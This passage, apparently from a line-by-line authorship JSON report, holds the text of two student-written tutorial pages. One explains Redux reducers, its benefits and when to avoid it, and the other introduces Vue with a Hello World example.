        },
        "content": "```js"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "function visibilityFilter(state \u003d \u0027SHOW_ALL\u0027, action) {"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  if (action.type \u003d\u003d\u003d \u0027SET_VISIBILITY_FILTER\u0027) {"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    return action.filter"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  } else {"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    return state"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  }"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "}"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "And secondly, a reducer, that manages the todo-list items `todos`:"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```js"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "function todos(state \u003d [], action) {"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  switch (action.type) {"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    case \u0027ADD_TODO\u0027:"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "      return state.concat([{ text: action.text, completed: false }])"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    case \u0027TOGGLE_TODO\u0027:"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "      return state.map((todo, index) \u003d\u003e"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "        action.index \u003d\u003d\u003d index"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "          ? { text: todo.text, completed: !todo.completed }"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "          : todo"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "      )"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    default:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "      return state"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  }"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "}"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "And these two reducers are called by a main reducer. With that the complete application state is managed."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```js"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "function todoApp(state \u003d {}, action) {"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  return {"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    todos: todos(state.todos, action),"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "    visibilityFilter: visibilityFilter(state.visibilityFilter, action)"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  }"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "}"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "```"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Finally, take note that there are no direct setters to the store, and the store is read-only. The only way the **store** is updated is through a strict unidirection data flow where: "
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "1. An **Action** is dispatched and,"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "1. Together with the current state read from the **Store**, is passed into a **Reducer**, which returns the new state.  "
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "## Why Use Redux? "
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Now that we know what Redux is, let us take a look at how the structure of Redux and its concepts make possible some benefits."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "1. **State is made predictable** \u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "In Redux, the single immutable store is the single source of truth for application state. Neither the view of the application, nor network callbacks directly write to it. Changes to the state are via actions, which Redux centralizes and keep in strict order via the unidirection data flow. Also, reducers are pure functions, always producing the same result for the same state and action. "
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003cbr/\u003e\u003cbr/\u003eHence application state is updated in a predictable and structured manner. Having a predictable state, makes it easier to implement functionality that would be otherwise difficult, such as \u003ctooltip content\u003d\"The general idea is to store the history of the state in the state! To read more, click the link.\"\u003e[Undo and Redo](https://redux.js.org/recipes/implementing-undo-history/)\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "2. **Easier to debug and inspect** \u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Since actions and state are plain objects, it is possible to serialize them and log them. [Redux DevTools](https://github.com/reduxjs/redux-devtools) provides first class support for application debugging. You can view a log of actions that took place, making it easy to understand errors in code. You can also print the store \u003ctooltip content\u003d\"for example using `console.log(store.getState())`\"\u003ewithin the code itself\u003c/tooltip\u003e. The Redux DevTools, used in the browser, also provides features such as a tree visualization of the application state, as well a time travel ability to replay state changes."
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "![Redux Devtool](https://user-images.githubusercontent.com/7957859/48663602-3aac4900-ea9b-11e8-921f-97059cbb599c.png)"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "_Redux DevTools_ ([image source](https://github.com/reduxjs/redux-devtools))"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "3. **Easier testing** \u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e\u003csup\u003e[[2]](#footnote2)\u003c/sup\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Using Redux makes for testable code. Since the reducers used to change the state are pure functions, it is easy make tests. Writing small, pure and isolated reducer functions in Redux, means we write small and isolated tests. For example, to test for the behavior of reducers, we simply write a reducer function, and define its arguments: a current state and an action. Then we write our expected output, and compare whether the reducer returns what is expected. You may learn more about testing in this [page](https://redux.js.org/recipes/writing-tests/)."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "4. **Redux is extensible**\u003cbr/\u003e"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Redux, while being a small library, has an [ecosystem of open source tools, extensions and open source libraries](https://redux.js.org/introduction/ecosystem). These are not compulsary to use, but can make it easier to solve problems that modern web applications face. Through the use of Redux, and some libraries within its ecosystem, we can fulfill \u003ctooltip content\u003d\"**Server-side rendering (SSR)** is a popular technique where you render the application on the server and then send a fully rendered page to the client.\"\u003e[server-side rendering](https://redux.js.org/recipes/server-rendering)\u003c/tooltip\u003e, and handle \u003ctooltip content\u003d\"**Asynchronous action**, are actions that run in parallel; they do not block. It is very common in web applications, because most applications fetch some kind of resource from an API.\"\u003e[asynchronous actions](https://redux.js.org/advanced/async-actions)\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "## When Not to Use Redux?"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "While Redux has its benefits, you should not add Redux for every application you make. You might be still getting experienced with your frontend framework for a project of yours, and adding Redux adds complexity because there is another set of concepts and practices to take note."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "In general, it would be apt to use Redux is when:"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "1. You have reasonable amount of data changing over time"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "1. You need a single source of truth"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "1. You find keeping everything in a top-level parent component is not enough"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Another good rule of thumb is to figure out if you have any problems managing state in your application without Redux. \u003cpopover effect\u003d\"scale\" header\u003d\"As said by Dan Abramov (one of the creators of Redux)\" content\u003d\"_I would like to amend this: don\u0027t use Redux until you have problems with vanilla React._\"\u003eIf you don\u0027t have any, then you don\u0027t really need Redux.\u003c/popover\u003e"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "There are many other articles on why you shouldn\u0027t or when you shouldn\u0027t use Redux. If you are interested, some articles \u003csup\u003e[[3]](#footnote3)\u003c/sup\u003e \u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e are available at the end of this page for further reading."
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "## Getting Started with Redux"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "The [official Redux website]((https://redux.js.org/)) is a great place to get started. It includes:"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- [Installation instructions](https://redux.js.org/introduction/getting-started/)"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- A suggested list of resources encompassing [Basic](https://redux.js.org/introduction/getting-started/#just-the-basics) and [Intermediate](https://redux.js.org/introduction/getting-started/#intermediate-concepts) concepts."
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- A [basic](https://redux.js.org/basics/basic-tutorial) and [advanced](https://redux.js.org/advanced/advanced-tutorial) tutorial."
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "This article is based on the the sections [Core Concepts](https://redux.js.org/introduction/core-concepts) and [Three Principles](https://redux.js.org/introduction/three-principles) of the introduction, so you may find the sections familiar and be able skim through those. However, it may be good to reinforce some of the cores concepts with the basic tutorial first, then proceed on with the advanced tutorial."
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Installing the [Redux DevTools](https://github.com/reduxjs/redux-devtools) would greatly help in terms of seeing Redux in action with whichever project or tutorial you are working on."
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Redux especially works well with React. Read up on [React Redux](https://react-redux.js.org/), which are official React bindings for Redux"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "Other popular frontend frameworks may have their own state management libraries more suited for them. Many of the concepts of state management libraries are borrowed from Redux, hence you may find their concepts familiar. Some other frontend libraries and their corresponding state management libraries are:"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- Vue: [Vuex](https://vuex.vuejs.org/)"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "- Angular: [NGRX](https://ngrx.io/)"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "## References/Further Reading"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003ca name\u003d\"footnote1\"\u003e[1]\u003c/a\u003e: [Why use Redux? Reasons with clear examples by Neo Ighodaro](https://blog.logrocket.com/why-use-redux-reasons-with-clear-examples-d21bffd5835/) \u003cbr /\u003e"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003ca name\u003d\"footnote2\"\u003e[2]\u003c/a\u003e: [Redux · An Introduction by Alex Bachuk](https://www.smashingmagazine.com/2016/06/an-introduction-to-redux/)\u003cbr /\u003e"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003ca name\u003d\"footnote3\"\u003e[3]\u003c/a\u003e: [You Might Not Need Redux by Dan Abramov](https://medium.com/@dan_abramov/you-might-not-need-redux-be46360cf367) \u003cbr /\u003e"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003ca name\u003d\"footnote4\"\u003e[4]\u003c/a\u003e: [When should I use Redux? (Redux Official Site)](https://redux.js.org/faq/general#when-should-i-use-redux) \u003cbr /\u003e"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "nbriannl"
        },
        "content": ""
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "nbriannl": 225
    }
  },
  {
    "path": "contents/javascript/Javascript-framework-VueJs.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "  title: Introduction to Vue"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Introduction to Vue"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: [Chelsey Ong](https://github.com/chelseyong), [Lu Lechuan](https://github.com/LuLechuan)** \u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Gilbert Emerson](https://github.com/emer7), [Ong Shu Peng](https://github.com/ongspxm)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "This chapter assumes that the reader has a basic knowledge of HTML and JavaScript."
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Vue?"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "\u003e*Vue* is an open-source [JavaScript framework](https://en.wikipedia.org/wiki/JavaScript_framework) for building user interfaces. It is designed to improve code quality and maintainability."
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "This is a simple example to show how easy it is to integrate VueJs into your web project:\u003cbr/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "The main HTML file:"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbody\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv id\u003d\"root\"\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003ch2\u003e{\\{ message }\\}\u003c/h2\u003e"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cscript src\u003d\"https://unpkg.com/vue@2.5.13/dist/vue.js\"\u003e\u003c/script\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cscript src\u003d\"the_path_to_the_javacript_file.js\"\u003e\u003c/script\u003e"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/body\u003e"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "This is inside the JavaScript file:"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "new Vue ({"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "  el: \u0027#root\u0027,"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "  data: {"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "    message: \"Hello World\""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"warning\"\u003e"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Note that `{\\{` and `}\\}` should be \u003ccode\u003e{\u003cspan\u003e{\u003c/span\u003e\u003c/code\u003e and \u003ccode\u003e}\u003cspan\u003e}\u003c/span\u003e\u003c/code\u003e respectively, due to the limitations of [MarkBind](https://markbind.org)."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "Step-by-step explanation of the code:"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "\u003cb\u003eStep 1:\u003c/b\u003e Import Vue \u003ctooltip content\u003d\"Content Delivery Network\" placement\u003d\"top\"\u003eCDN\u003c/tooltip\u003e and the JavaScript file in the main HTML file."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cscript src\u003d\"https://unpkg.com/vue@2.5.13/dist/vue.js\"\u003e\u003c/script\u003e"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cscript src\u003d\"the_path_to_the_javacript_file.js\"\u003e\u003c/script\u003e"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cb\u003eStep 2:\u003c/b\u003e Create an instance of Vue (Vue is an object) in the JavaScript file; bind the instance to one of the component in our html file (e.g. create a component with id `root` and bind it with the instance of Vue).\u003cbr/\u003e"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "In this case, only the `root` component can be accessed in Vue while the rest are unaffected. This is how we progressively plug in Vue into our projects."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "  new Vue ({"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "    el: \u0027#root\u0027,"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "  });"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv id\u003d\"root\"\u003e\u003c/div\u003e"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cb\u003eStep 3:\u003c/b\u003e Specify our data (message: \"Hello World\") in the instance of Vue Class."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "  data: {"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "    message: \"Hello World\""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cb\u003eStep 4:\u003c/b\u003e Pass the message to the HTML file using double curly brackets."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```HTML"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv id\u003d\"root\"\u003e"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    \u003ch2\u003e{\\{message}\\}\u003c/h2\u003e"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003cb\u003eStep 5:\u003c/b\u003e Open the browser and we will see \"Hello World\" being displayed:"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e \u003ch2\u003eHello World\u003c/h2\u003e"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Vue Features"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "1. **Mutating of Data in the DOM**\u003cbr\u003e"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "    In Vue, the state of the data can be directly modified."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "    Let\u0027s say, there is a variable called `message` in your app. To modify `message`, you can do the following:"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "    ```js"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "    this.message \u003d \u0027Hello Space\u0027;"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    When `message` is changed, the view will be re-rendered to show the new message. So you can say, the DOM is \"reacting\" to the changes in `message`."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "2. **Two-way binding**\u003cbr\u003e"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
